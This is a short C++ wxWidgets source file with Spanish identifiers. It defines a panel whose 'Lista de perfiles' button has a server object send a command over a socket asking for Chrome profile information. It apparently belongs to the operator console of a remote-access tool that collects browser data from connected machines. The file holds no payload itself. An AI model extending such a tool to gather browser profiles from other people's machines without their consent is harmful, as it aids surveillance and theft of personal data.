#include "panel_info_chrome.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelInfoChrome, wxPanel)
	EVT_BUTTON(EnumChromeInfoIDS::BTN_Profiles, panelInfoChrome::OnListaPerfiles)
wxEND_EVENT_TABLE()

panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
	: wxPanel(pParent, wxID_ANY) {
	
	this->sckSocket = sck_socket;

	wxButton* btn = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Lista de perfiles");

}

void panelInfoChrome::OnListaPerfiles(wxCommandEvent&) {
	p_Servidor->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, EnumComandos::INF_Chrome_Profiles);
}